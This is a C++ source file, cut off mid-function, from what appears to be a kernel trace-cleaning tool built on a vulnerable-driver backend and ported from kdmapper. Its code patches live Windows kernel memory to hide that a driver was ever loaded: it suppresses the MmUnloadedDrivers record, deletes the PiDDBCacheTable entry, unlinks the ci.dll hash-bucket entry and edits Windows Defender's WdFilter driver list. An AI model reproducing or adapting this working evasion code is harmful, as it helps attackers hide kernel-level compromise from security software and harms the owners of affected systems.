#include "hinv_cleaner.hpp"
#include "hinv_kmem.hpp"
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <iostream>
#include <cwctype>
#include <algorithm>
#include <cstring>
#include <cstddef>
#include <cstdio>
#include <fstream>
#include <filesystem>

// Kernel structure layouts and pattern bytes below are ported from
// TheCruZ/kdmapper (intel_driver.cpp / nt.hpp, MIT), validated live against
// Windows 11 26200 during development.

namespace hinv {
namespace cleaner {

// ---------------------------------------------------------------------------
// Kernel structure layouts (x64)
// ---------------------------------------------------------------------------

struct KRTL_BALANCED_LINKS {
    KRTL_BALANCED_LINKS* Parent;
    KRTL_BALANCED_LINKS* LeftChild;
    KRTL_BALANCED_LINKS* RightChild;
    char  Balance;
    uint8_t Reserved[3];
};

struct KRTL_AVL_TABLE {
    KRTL_BALANCED_LINKS BalancedRoot;
    void*    OrderedPointer;
    uint32_t WhichOrderedElement;
    uint32_t NumberGenericTableElements;
    uint32_t DepthOfTree;
    void*    RestartKey;
    uint32_t DeleteCount;
    void*    CompareRoutine;
    void*    AllocateRoutine;
    void*    FreeRoutine;
    void*    TableContext;
};

struct PiDDBCacheEntry {
    LIST_ENTRY     List;
    UNICODE_STRING DriverName;
    uint32_t       TimeDateStamp;
    NTSTATUS       LoadStatus;
    char           _pad[16];
};

struct HashBucketEntry {
    HashBucketEntry* Next;
    UNICODE_STRING   DriverName;
    uint32_t         CertHash[5];
};

struct SystemHandle {
    void*    Object;
    HANDLE   UniqueProcessId;
    HANDLE   HandleValue;
    uint32_t GrantedAccess;
    uint16_t CreatorBackTraceIndex;
    uint16_t ObjectTypeIndex;
    uint32_t HandleAttributes;
    uint32_t Reserved;
};

struct SystemHandleInformationEx {
    size_t       HandleCount;
    size_t       Reserved;
    SystemHandle Handles[1];
};

constexpr ULONG SystemExtendedHandleInformationClass = 64;

static_assert(offsetof(PiDDBCacheEntry, TimeDateStamp) == 0x20, "PiDDBCacheEntry layout drifted");
static_assert(offsetof(PiDDBCacheEntry, LoadStatus) == 0x24, "PiDDBCacheEntry layout drifted");
static_assert(offsetof(KRTL_AVL_TABLE, DeleteCount) == 0x40, "RTL_AVL_TABLE layout drifted");
static_assert(offsetof(HashBucketEntry, DriverName) == 0x8, "HashBucketEntry layout drifted");

// ---------------------------------------------------------------------------
// Small helpers
// ---------------------------------------------------------------------------

static std::wstring ToLower(std::wstring s) {
    std::transform(s.begin(), s.end(), s.begin(), ::towlower);
    return s;
}

static uint64_t FindModuleBase(const wchar_t* moduleName) {
    std::wstring target = ToLower(moduleName);
    for (const auto& m : kmem::EnumKernelModules()) {
        if (ToLower(m.name) == target) return m.base;
    }
    return 0;
}

// A resolved global/function must stay inside its owning module's image — a
// wrong pattern match must never become a wild kernel access or call.
static bool IsInModule(uint64_t moduleBase, uint64_t va) {
    for (const auto& m : kmem::EnumKernelModules()) {
        if (m.base == moduleBase) return va >= moduleBase && va < moduleBase + m.size;
    }
    return false;
}

// Locate a section of a loaded module by name. Returns its kernel VA.
static uint64_t FindModuleSection(byovd::IByovdBackend* backend, uint64_t moduleBase,
                                  const char* sectionName, uint32_t& outSize) {
    IMAGE_DOS_HEADER dos{};
    if (!backend->ReadKernelMemory(moduleBase, &dos, sizeof(dos))) return 0;
    IMAGE_NT_HEADERS64 nt{};
    if (!backend->ReadKernelMemory(moduleBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;

    uint16_t numSections = nt.FileHeader.NumberOfSections;
    std::vector<IMAGE_SECTION_HEADER> sections(numSections);
    uint64_t sectionTable = moduleBase + dos.e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader;
    if (!backend->ReadKernelMemory(sectionTable, sections.data(), numSections * sizeof(IMAGE_SECTION_HEADER))) return 0;

    for (const auto& sec : sections) {
        if (std::strncmp(reinterpret_cast<const char*>(sec.Name), sectionName, IMAGE_SIZEOF_SHORT_NAME) == 0) {
            outSize = sec.Misc.VirtualSize;
            return moduleBase + sec.VirtualAddress;
        }
    }
    return 0;
}

static bool PatternMatch(const uint8_t* data, const std::vector<uint8_t>& pattern, const std::vector<bool>& mask) {
    for (size_t i = 0; i < pattern.size(); ++i) {
        if (mask[i] && data[i] != pattern[i]) return false;
    }
    return true;
}

static uint64_t FindPattern(byovd::IByovdBackend* backend, uint64_t begin, uint32_t size,
                            const std::vector<uint8_t>& pattern, const std::vector<bool>& mask) {
    if (pattern.size() != mask.size() || pattern.empty() || !size) return 0;

    constexpr size_t CHUNK = 0x1000;
    std::vector<uint8_t> buffer(CHUNK + pattern.size());

    for (uint32_t off = 0; off < size; off += CHUNK) {
        uint32_t readSize = (off + CHUNK > size) ? (size - off) : CHUNK;
        readSize = static_cast<uint32_t>(readSize + pattern.size());
        if (off + readSize > size) readSize = size - off;

        if (!backend->ReadKernelMemory(begin + off, buffer.data(), readSize)) continue;

        for (size_t i = 0; i + pattern.size() <= readSize; ++i) {
            if (PatternMatch(buffer.data() + i, pattern, mask)) return begin + off + i;
        }
    }
    return 0;
}

// Resolve the target of `lea reg, [rip + rel32]` at leaVa (REX.W 8D /r form).
static uint64_t ResolveLeaTarget(byovd::IByovdBackend* backend, uint64_t leaVa) {
    uint32_t relRaw = 0;
    if (!kmem::ReadU32(backend, leaVa + 3, relRaw)) return 0;
    int32_t rel = static_cast<int32_t>(relRaw);
    return leaVa + 7 + rel;
}

// ---------------------------------------------------------------------------
// Kernel call wrappers (kmem::CallKernelFunction — NtAddAtom hook underneath)
// ---------------------------------------------------------------------------

static bool KAcquireResourceExclusive(byovd::IByovdBackend* backend, uint64_t lockVa) {
    static uint64_t fn = 0;
    if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAcquireResourceExclusiveLite");
    if (!fn) return false;
    uint8_t out = 0;
    return kmem::CallKernelFunction(backend, &out, fn, lockVa, 1ULL) && out;
}

static bool KReleaseResource(byovd::IByovdBackend* backend, uint64_t lockVa) {
    static uint64_t fn = 0;
    if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "ExReleaseResourceLite");
    if (!fn) return false;
    return kmem::CallKernelFunction<void>(backend, nullptr, fn, lockVa);
}

static uint64_t KLookupAvl(byovd::IByovdBackend* backend, uint64_t tableVa, void* userEntry) {
    static uint64_t fn = 0;
    if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "RtlLookupElementGenericTableAvl");
    if (!fn) return 0;
    uint64_t out = 0;
    if (!kmem::CallKernelFunction(backend, &out, fn, tableVa, reinterpret_cast<uint64_t>(userEntry)))
        return 0;
    return out;
}

static bool KDeleteAvl(byovd::IByovdBackend* backend, uint64_t tableVa, uint64_t entryVa) {
    static uint64_t fn = 0;
    if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "RtlDeleteElementGenericTableAvl");
    if (!fn) return false;
    uint8_t out = 0;
    return kmem::CallKernelFunction(backend, &out, fn, tableVa, entryVa) && out;
}

static bool KFreePool(byovd::IByovdBackend* backend, uint64_t va) {
    static uint64_t fn = 0;
    if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "ExFreePool");
    if (!fn) return false;
    return kmem::CallKernelFunction<void>(backend, nullptr, fn, va);
}

// ---------------------------------------------------------------------------
// Driver file timestamp (for the PiDDB AVL lookup)
// ---------------------------------------------------------------------------

uint32_t GetDriverFileTimestamp(const std::wstring& driverPath) {
    std::ifstream file(std::filesystem::path(driverPath), std::ios::binary);
    if (!file.is_open()) return 0;

    std::vector<uint8_t> headers(0x1000, 0);
    file.read(reinterpret_cast<char*>(headers.data()), headers.size());
    if (file.gcount() < 0x200) return 0;

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(headers.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    int64_t ntOff = static_cast<int64_t>(dos->e_lfanew);
    if (ntOff < 0 || ntOff + static_cast<int64_t>(sizeof(IMAGE_NT_HEADERS64)) > static_cast<int64_t>(headers.size()))
        return 0;
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(headers.data() + ntOff);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    return nt->FileHeader.TimeDateStamp;
}

// ---------------------------------------------------------------------------
// MmUnloadedDrivers — DISABLED for post-hoc cleaning (fail-closed)
// ---------------------------------------------------------------------------
//
// The array layout is build-dependent and it is only written by
// MiRememberUnloadedDriver at unload time. Instead of parsing it, the backend
// calls PreventUnloadedDriverTrace() before unload, zeroing the driver name in
// its own KLDR_DATA_TABLE_ENTRY so the trace is never recorded (kdmapper
// approach, validated live on build 26200).

bool ClearUnloadedDriverEntry(byovd::IByovdBackend* backend, const std::wstring& driverName) {
    (void)backend; (void)driverName;
    std::wcerr << L"[hinv::cleaner] MmUnloadedDrivers post-hoc cleaning is DISABLED "
               << L"(handled by PreventUnloadedDriverTrace at backend unload)\n";
    return false;
}

bool PreventUnloadedDriverTrace(byovd::IByovdBackend* backend, HANDLE deviceHandle) {
    kmem::Trace("cleaner: prevent begin");
    if (!backend || !deviceHandle || deviceHandle == INVALID_HANDLE_VALUE) {
        kmem::Trace("cleaner: prevent bail (args)");
        return false;
    }

    auto NtQuerySystemInformation = reinterpret_cast<NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG)>(reinterpret_cast<void*>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation")));
    if (!NtQuerySystemInformation) { kmem::Trace("cleaner: prevent bail (resolve)"); return false; }

    // Find our own device handle's kernel object via the extended handle table.
    // This class reports only the header size (56) on a null-buffer call; the
    // real requirement arrives in ReturnLength of a too-small fill call — so
    // use one in/out size variable and loop until the growing table fits.
    ULONG size = 0;
    std::vector<uint8_t> buffer;
    NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
    for (int tries = 0; tries < 16 && status == STATUS_INFO_LENGTH_MISMATCH; ++tries) {
        status = NtQuerySystemInformation(SystemExtendedHandleInformationClass,
                                          buffer.empty() ? nullptr : buffer.data(),
                                          static_cast<ULONG>(buffer.size()), &size);
        if (status == STATUS_INFO_LENGTH_MISMATCH && size) buffer.assign(size, 0);
    }
    if (!NT_SUCCESS(status) || buffer.empty()) {
        char dbg[96];
        std::snprintf(dbg, sizeof(dbg), "cleaner: prevent bail (query status=0x%08lX size=%lu)",
                      static_cast<unsigned long>(status), static_cast<unsigned long>(size));
        kmem::Trace(dbg);
        return false;
    }

    uint64_t fileObject = 0;
    auto* info = reinterpret_cast<SystemHandleInformationEx*>(buffer.data());
    for (size_t i = 0; i < info->HandleCount; ++i) {
        const auto& h = info->Handles[i];
        if (h.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
            continue;
        if (h.HandleValue == deviceHandle) {
            fileObject = reinterpret_cast<uint64_t>(h.Object);
            break;
        }
    }
    if (!fileObject) { kmem::Trace("cleaner: prevent bail (handle not found)"); return false; }

    // FILE_OBJECT +0x8 -> DEVICE_OBJECT +0x8 -> DRIVER_OBJECT +0x28 ->
    // KLDR_DATA_TABLE_ENTRY; its BaseDllName UNICODE_STRING lives at +0x58.
    uint64_t deviceObject = 0, driverObject = 0, driverSection = 0;
    if (!kmem::ReadU64(backend, fileObject + 0x8, deviceObject) || !deviceObject) {
        kmem::Trace("cleaner: prevent bail (device)"); return false;
    }
    if (!kmem::ReadU64(backend, deviceObject + 0x8, driverObject) || !driverObject) {
        kmem::Trace("cleaner: prevent bail (driver)"); return false;
    }
    if (!kmem::ReadU64(backend, driverObject + 0x28, driverSection) || !driverSection) {
        kmem::Trace("cleaner: prevent bail (section)"); return false;
    }

    UNICODE_STRING name{};
    if (!backend->ReadKernelMemory(driverSection + 0x58, &name, sizeof(name)) || name.Length == 0) {
        kmem::Trace("cleaner: prevent bail (name)"); return false;
    }

    std::vector<wchar_t> nameBuf(name.Length / 2 + 1, 0);
    backend->ReadKernelMemory(reinterpret_cast<uint64_t>(name.Buffer), nameBuf.data(), name.Length);
    std::wcout << L"[hinv::cleaner] Arming MmUnloadedDrivers prevention for " << nameBuf.data() << L"\n";

    // Length == 0 makes MiRememberUnloadedDriver skip recording the unload.
    UNICODE_STRING zeroed = name;
    zeroed.Length = 0;
    bool ok = backend->WriteKernelMemory(driverSection + 0x58, &zeroed, sizeof(zeroed));
    kmem::Trace(ok ? "cleaner: unload prevention armed" : "cleaner: unload prevention failed");
    return ok;
}

// ---------------------------------------------------------------------------
// PiDDBCacheTable (RTL_AVL_TABLE since ~1607) — kdmapper patterns + AVL delete
// ---------------------------------------------------------------------------

bool ClearPiDddbCache(byovd::IByovdBackend* backend, const std::wstring& driverName, uint32_t driverFileTimestamp) {
    if (!backend || driverName.empty()) return false;

    uint64_t ntosBase = FindModuleBase(L"ntoskrnl.exe");
    if (!ntosBase) return false;

    uint32_t pageSize = 0;
    uint64_t pageVa = FindModuleSection(backend, ntosBase, "PAGE", pageSize);
    if (!pageVa || !pageSize) return false;

    // PiDDBLock patterns (lea rcx, PiDDBLock sits at a fixed offset in each).
    uint64_t lockVa = 0;
    {
        // build <= 22000: ... B2 01 48 8D 0D ?? ?? ?? ?? E8 — lea at match+28
        std::vector<uint8_t> pat = { 0x8B, 0xD8, 0x85, 0xC0, 0x0F, 0x88, 0, 0, 0, 0, 0x65, 0x48, 0x8B, 0x04, 0x25, 0, 0, 0, 0,
                                     0x66, 0xFF, 0x88, 0, 0, 0, 0, 0xB2, 0x01, 0x48, 0x8D, 0x0D, 0, 0, 0, 0, 0xE8, 0, 0, 0, 0, 0x4C, 0x8B, 0, 0x24 };
        std::vector<bool>   msk = { 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0,
                                    1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1 };
        uint64_t m = FindPattern(backend, pageVa, pageSize, pat, msk);
        if (m) lockVa = ResolveLeaTarget(backend, m + 28);
    }
    if (!lockVa) {
        // build 22449+: second 48 8D 0D at match+16
        std::vector<uint8_t> pat = { 0x48, 0x8B, 0x0D, 0, 0, 0, 0, 0x48, 0x85, 0xC9, 0x0F, 0x85, 0, 0, 0, 0,
                                     0x48, 0x8D, 0x0D, 0, 0, 0, 0, 0xE8, 0, 0, 0, 0, 0xE8 };
        std::vector<bool>   msk = { 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0,
                                    1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1 };
        uint64_t m = FindPattern(backend, pageVa, pageSize, pat, msk);
        if (m) lockVa = ResolveLeaTarget(backend, m + 16);
    }
    if (!lockVa) {
        // build 26100+: 48 8D 0D at match+19
        std::vector<uint8_t> pat = { 0x8B, 0xD8, 0x85, 0xC0, 0x0F, 0x88, 0, 0, 0, 0, 0x65, 0x48, 0x8B, 0x04, 0x25, 0, 0, 0, 0,
                                     0x48, 0x8D, 0x0D, 0, 0, 0, 0, 0xB2, 0x01, 0x66, 0xFF, 0x88, 0, 0, 0, 0, 0x90, 0xE8, 0, 0, 0, 0, 0x4C, 0x8B, 0, 0x24 };
        std::vector<bool>   msk = { 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0,
                                    1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1 };
        uint64_t m = FindPattern(backend, pageVa, pageSize, pat, msk);
        if (m) lockVa = ResolveLeaTarget(backend, m + 19);
    }

    // PiDDBCacheTable patterns.
    uint64_t tableVa = 0;
    {
        std::vector<uint8_t> pat = { 0x66, 0x03, 0xD2, 0x48, 0x8D, 0x0D };
        std::vector<bool>   msk = { 1, 1, 1, 1, 1, 1 };
        uint64_t m = FindPattern(backend, pageVa, pageSize, pat, msk);
        if (m) tableVa = ResolveLeaTarget(backend, m + 3);
    }
    if (!tableVa) {
        std::vector<uint8_t> pat = { 0x48, 0x8B, 0xF9, 0x33, 0xC0, 0x48, 0x8D, 0x0D };
        std::vector<bool>   msk = { 1, 1, 1, 1, 1, 1, 1, 1 };
        uint64_t m = FindPattern(backend, pageVa, pageSize, pat, msk);
        if (m) tableVa = ResolveLeaTarget(backend, m + 5);
    }

    if (!lockVa || !tableVa || !IsInModule(ntosBase, lockVa) || !IsInModule(ntosBase, tableVa)) {
        std::wcerr << L"[hinv::cleaner] PiDDB globals not located on this build\n";
        return false;
    }
    // The table pattern is only 6 bytes — weak. Before taking the lock and
    // calling into the AVL routines, sanity-check the candidate: a real
    // RTL_AVL_TABLE has a CompareRoutine inside ntoskrnl's .text and a
    // plausible element count. A false positive here would otherwise become an
    // RtlLookup/Delete on garbage → bugcheck.
    {
        uint64_t cmp = 0;
        uint32_t elemCount = 0;
        if (!kmem::ReadU64(backend, tableVa + offsetof(KRTL_AVL_TABLE, CompareRoutine), cmp) ||
            !kmem::ReadU32(backend, tableVa + offsetof(KRTL_AVL_TABLE, NumberGenericTableElements), elemCount) ||
            !IsInModule(ntosBase, cmp) || elemCount > 0x100000) {
            std::wcerr << L"[hinv::cleaner] PiDDBCacheTable candidate failed sanity check, aborting\n";
            return false;
        }
    }
    std::cout << "[hinv::cleaner] PiDDBLock=0x" << std::hex << lockVa << " PiDDBCacheTable=0x" << tableVa << std::dec << "\n";

    kmem::Trace("cleaner: piddb lock acquire");
    if (!KAcquireResourceExclusive(backend, lockVa)) {
        std::wcerr << L"[hinv::cleaner] Failed to lock PiDDBLock\n";
        return false;
    }
    kmem::Trace("cleaner: piddb locked");

    bool cleaned = false;

    // The kernel stores the driver file name; try with and without extension.
    std::wstring fileName = driverName;
    size_t slash = fileName.find_last_of(L"\\/");
    if (slash != std::wstring::npos) fileName = fileName.substr(slash + 1);
    std::wstring stem = fileName;
    size_t dot = stem.find_last_of(L'.');
    if (dot != std::wstring::npos) stem = stem.substr(0, dot);

    for (const std::wstring& variant : { fileName, stem }) {
        if (variant.empty()) continue;

        PiDDBCacheEntry local{};
        local.TimeDateStamp = driverFileTimestamp;
        local.DriverName.Buffer = const_cast<PWSTR>(variant.c_str());
        local.DriverName.Length = static_cast<USHORT>(variant.size() * sizeof(wchar_t));
        local.DriverName.MaximumLength = local.DriverName.Length + sizeof(wchar_t);

        uint64_t entry = KLookupAvl(backend, tableVa, &local);
        if (!entry) continue;

        std::cout << "[hinv::cleaner] PiDDB entry found at 0x" << std::hex << entry << std::dec << "\n";
        kmem::Trace("cleaner: piddb entry found");

        // Unlink from the list first, then remove from the AVL tree.
        uint64_t prev = 0, next = 0;
        if (!kmem::ReadU64(backend, entry + offsetof(PiDDBCacheEntry, List.Blink), prev) ||
            !kmem::ReadU64(backend, entry + offsetof(PiDDBCacheEntry, List.Flink), next) || !prev || !next)
            break;

        if (!kmem::WriteU64(backend, prev + offsetof(LIST_ENTRY, Flink), next) ||
            !kmem::WriteU64(backend, next + offsetof(LIST_ENTRY, Blink), prev))
            break;

        if (!KDeleteAvl(backend, tableVa, entry)) break;
        kmem::Trace("cleaner: piddb avl deleted");

        uint32_t deleteCount = 0;
        if (kmem::ReadU32(backend, tableVa + offsetof(KRTL_AVL_TABLE, DeleteCount), deleteCount) && deleteCount > 0) {
            deleteCount--;
            kmem::WriteU32(backend, tableVa + offsetof(KRTL_AVL_TABLE, DeleteCount), deleteCount);
        }
        cleaned = true;
        break;
    }

    KReleaseResource(backend, lockVa);
    kmem::Trace(cleaned ? "cleaner: piddb done (cleaned)" : "cleaner: piddb done (not found)");

    if (cleaned) std::wcout << L"[hinv::cleaner] PiDDBCacheTable cleaned for " << driverName << L"\n";
    return cleaned;
}

// ---------------------------------------------------------------------------
// g_KernelHashBucketList (ci.dll) — kdmapper patterns + list unlink
// ---------------------------------------------------------------------------

bool ClearKernelHashBucketList(byovd::IByovdBackend* backend, const std::wstring& driverName) {
    if (!backend || driverName.empty()) return false;

    uint64_t ciBase = FindModuleBase(L"ci.dll");
    if (!ciBase) return false;

    uint32_t pageSize = 0;
    uint64_t pageVa = FindModuleSection(backend, ciBase, "PAGE", pageSize);
    if (!pageVa || !pageSize) return false;

    // g_KernelHashBucketList: 48 8B 1D ?? ?? ?? ?? EB ?? F7 43 40 00 20 00 00
    uint64_t bucketListVa = 0;
    uint64_t matchVa = 0;
    {
        std::vector<uint8_t> pat = { 0x48, 0x8B, 0x1D, 0, 0, 0, 0, 0xEB, 0, 0xF7, 0x43, 0x40, 0x00, 0x20, 0x00, 0x00 };
        std::vector<bool>   msk = { 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1 };
        matchVa = FindPattern(backend, pageVa, pageSize, pat, msk);
        if (matchVa) {
            // mov rbx, [rip+rel32] at match: rel32 at +3, len 7
            uint32_t relRaw = 0;
            if (kmem::ReadU32(backend, matchVa + 3, relRaw))
                bucketListVa = matchVa + 7 + static_cast<int32_t>(relRaw);
        }
    }
    if (!bucketListVa) {
        std::wcerr << L"[hinv::cleaner] g_KernelHashBucketList not located on this build\n";
        return false;
    }

    // g_HashCacheLock: a `lea rcx, [rip+rel]` shortly BEFORE the list reference
    // (kdmapper scans [sig-50, sig)). Scanning past matchVa could catch a lea
    // AFTER the signature and resolve the wrong ERESOURCE — unlinking the list
    // under the wrong lock is a race with CI.
    uint64_t hashLockVa = 0;
    {
        uint64_t scanStart = (matchVa > pageVa + 56) ? (matchVa - 56) : pageVa;
        uint8_t window[64]{};
        if (backend->ReadKernelMemory(scanStart, window, sizeof(window))) {
            for (size_t i = 0; i + 7 <= sizeof(window); ++i) {
                if (scanStart + i >= matchVa) break; // never scan past the signature
                if (window[i] == 0x48 && window[i + 1] == 0x8D && window[i + 2] == 0x0D) {
                    hashLockVa = ResolveLeaTarget(backend, scanStart + i);
                    break;
                }
            }
        }
    }
    if (!hashLockVa || !IsInModule(ciBase, bucketListVa) || !IsInModule(ciBase, hashLockVa)) {
        std::wcerr << L"[hinv::cleaner] g_HashCacheLock not located on this build\n";
        return false;
    }
    std::cout << "[hinv::cleaner] g_KernelHashBucketList=0x" << std::hex << bucketListVa
              << " g_HashCacheLock=0x" << hashLockVa << std::dec << "\n";

    kmem::Trace("cleaner: hashbucket lock acquire");
    if (!KAcquireResourceExclusive(backend, hashLockVa)) {
        std::wcerr << L"[hinv::cleaner] Failed to lock g_HashCacheLock\n";
        return false;
    }
    kmem::Trace("cleaner: hashbucket locked");

    bool cleaned = false;

    std::wstring fileName = ToLower(driverName);
    size_t slash = fileName.find_last_of(L"\\/");
    if (slash != std::wstring::npos) fileName = fileName.substr(slash + 1);
    std::wstring stem = fileName;
    size_t dot = stem.find_last_of(L'.');
    if (dot != std::wstring::npos) stem = stem.substr(0, dot);

    uint64_t prev = bucketListVa; // the global holds the first entry pointer
    uint64_t entry = 0;
    if (kmem::ReadU64(backend, prev, entry)) {
        while (entry) {
            uint16_t nameLen = 0;
            if (!backend->ReadKernelMemory(entry + offsetof(HashBucketEntry, DriverName.Length), &nameLen, sizeof(nameLen)) || !nameLen)
                break;
            uint64_t namePtr = 0;
            if (!kmem::ReadU64(backend, entry + offsetof(HashBucketEntry, DriverName.Buffer), namePtr) || !namePtr)
                break;
            std::vector<wchar_t> nameBuf(nameLen / 2 + 1, 0);
            if (!backend->ReadKernelMemory(namePtr, nameBuf.data(), nameLen))
                break;

            std::wstring entryName = ToLower(nameBuf.data());
            // Exact match only: a substring test makes "foo.sys" hit
            // "foobar.sys", and an empty stem would match every entry.
            if (entryName == fileName || (!stem.empty() && entryName == stem)) {
                uint64_t next = 0;
                if (!kmem::ReadU64(backend, entry, next)) break;
                if (!kmem::WriteU64(backend, prev, next)) break;
                kmem::Trace("cleaner: hashbucket entry unlinked");
                if (!KFreePool(backend, entry)) break;
                cleaned = true;
                break;
            }

            prev = entry;
            if (!kmem::ReadU64(backend, entry, entry)) break;
        }
    }

    KReleaseResource(backend, hashLockVa);

    if (cleaned) std::wcout << L"[hinv::cleaner] g_KernelHashBucketList cleaned for " << driverName << L"\n";
    return cleaned;
}

// ---------------------------------------------------------------------------
// WdFilter runtime driver list — kdmapper patterns (skipped when not loaded)
// ---------------------------------------------------------------------------

bool ClearWdFilterDriverList(byovd::IByovdBackend* backend, const std::wstring& driverName) {
    if (!backend || driverName.empty()) return false;

    uint64_t wdfBase = FindModuleBase(L"wdfilter.sys");
    if (!wdfBase) {
        std::cout << "[hinv::cleaner] WdFilter.sys not loaded, nothing to clean\n";
        return false; // absence is not success: the caller must know nothing was removed
    }

    uint32_t pageSize = 0;
    uint64_t pageVa = FindModuleSection(backend, wdfBase, "PAGE", pageSize);
    if (!pageVa || !pageSize) return false;

    // RuntimeDriversList: 48 8B 0D ?? ?? ?? ?? FF 05
    uint64_t listRef = 0;
    {
        std::vector<uint8_t> pat = { 0x48, 0x8B, 0x0D, 0, 0, 0, 0, 0xFF, 0x05 };
        std::vector<bool>   msk = { 1, 1, 1, 0, 0, 0, 0, 1, 1 };
        listRef = FindPattern(backend, pageVa, pageSize, pat, msk);
    }
    // RuntimeDriversCount: FF 05 ?? ?? ?? ?? 48 39 11
    uint64_t countRef = 0;
    {
        std::vector<uint8_t> pat = { 0xFF, 0x05, 0, 0, 0, 0, 0x48, 0x39, 0x11 };
        std::vector<bool>   msk = { 1, 1, 0, 0, 0, 0, 1, 1, 1 };
        countRef = FindPattern(backend, pageVa, pageSize, pat, msk);
    }
    // MpFreeDriverInfoEx reference: two pattern variants ending in E8 .. E9.
    // kdmapper offsets: pattern 1 has the call at match+3, pattern 2 at +6 —
    // each branch applies its own adjustment, there is no shared extra +3.
    uint64_t freeRef = 0;
    {
        std::vector<uint8_t> pat = { 0x89, 0, 0x08, 0xE8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0xE9 };
        std::vector<bool>   msk = { 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };
        freeRef = FindPattern(backend, pageVa, pageSize, pat, msk);
        if (freeRef) {
            freeRef += 0x3; // E8 at match+3
        } else {
            std::vector<uint8_t> pat2 = { 0x89, 0, 0x08, 0, 0, 0, 0xE8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0xE9 };
            std::vector<bool>   msk2 = { 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };
            freeRef = FindPattern(backend, pageVa, pageSize, pat2, msk2);
            if (freeRef) freeRef += 0x3 + 0x3; // E8 at match+6
        }
    }

    if (!listRef || !countRef || !freeRef) {
        std::wcerr << L"[hinv::cleaner] WdFilter globals not located on this build\n";
        return false;
    }

    // The pattern matches themselves must be inside WdFilter's image — a false
    // positive on an incompatible build must never become a wild kernel read.
    if (!IsInModule(wdfBase, listRef) || !IsInModule(wdfBase, countRef) || !IsInModule(wdfBase, freeRef)) {
        std::wcerr << L"[hinv::cleaner] WdFilter pattern match outside image, aborting\n";
        return false;
    }

    // Resolve the relative references (kdmapper offsets).
    uint64_t runtimeDriversList = 0; {
        uint32_t rel = 0;
        if (!kmem::ReadU32(backend, listRef + 3, rel)) return false;
        runtimeDriversList = listRef + 7 + static_cast<int32_t>(rel);
    }
    uint64_t runtimeDriversCount = 0; {
        uint32_t rel = 0;
        if (!kmem::ReadU32(backend, countRef + 2, rel)) return false;
        runtimeDriversCount = countRef + 6 + static_cast<int32_t>(rel);
    }
    uint64_t mpFreeDriverInfoEx = 0; {
        uint32_t rel = 0;
        if (!kmem::ReadU32(backend, freeRef + 1, rel)) return false;
        mpFreeDriverInfoEx = freeRef + 5 + static_cast<int32_t>(rel);
    }
    // All resolved addresses must live inside WdFilter's image; a bad pattern
    // match must never turn into a wild kernel call. This validation happens
    // BEFORE any pointer derived from them is dereferenced.
    if (!IsInModule(wdfBase, runtimeDriversList) || !IsInModule(wdfBase, runtimeDriversCount) ||
        !IsInModule(wdfBase, mpFreeDriverInfoEx)) {
        std::wcerr << L"[hinv::cleaner] WdFilter resolution out of image range, aborting\n";
        return false;
    }

    uint64_t runtimeDriversListHead = runtimeDriversList - 0x8;
    uint64_t runtimeDriversArray = runtimeDriversCount + 0x8;
    if (!kmem::ReadU64(backend, runtimeDriversArray, runtimeDriversArray)) return false;

    std::wstring fileName = ToLower(driverName);
    size_t slash = fileName.find_last_of(L"\\/");
    if (slash != std::wstring::npos) fileName = fileName.substr(slash + 1);
    std::wstring stem = fileName;
    size_t dot = stem.find_last_of(L'.');
    if (dot != std::wstring::npos) stem = stem.substr(0, dot);

    uint64_t entry = 0;
    if (!kmem::ReadU64(backend, runtimeDriversListHead, entry) || !entry) return false;

    // Cap the walk: a corrupted list (self-referencing Flink) must never hang
    // usermode forever.
    for (int iterations = 0; entry != runtimeDriversListHead; ++iterations) {
        if (iterations > 4096) {
            std::wcerr << L"[hinv::cleaner] WdFilter list walk exceeded 4096 entries, aborting\n";
            return false;
        }
        UNICODE_STRING us{};
        if (!backend->ReadKernelMemory(entry + 0x10, &us, sizeof(us)) || !us.Buffer || !us.Length) break;

        std::vector<wchar_t> nameBuf(us.Length / 2 + 1, 0);
        if (!backend->ReadKernelMemory(reinterpret_cast<uint64_t>(us.Buffer), nameBuf.data(), us.Length)) break;

        std::wstring entryName = ToLower(nameBuf.data());
        // Exact match only (see PiDDB/hashbucket notes on substring hazards).
        if (entryName != fileName && (stem.empty() || entryName != stem)) {
            if (!kmem::ReadU64(backend, entry + offsetof(LIST_ENTRY, Flink), entry)) break;
            if (!entry) break;
            continue;
        }

        // Remove from the array: find the slot pointing at Entry - 0x10.
        uint64_t sameIndexList = entry - 0x10;
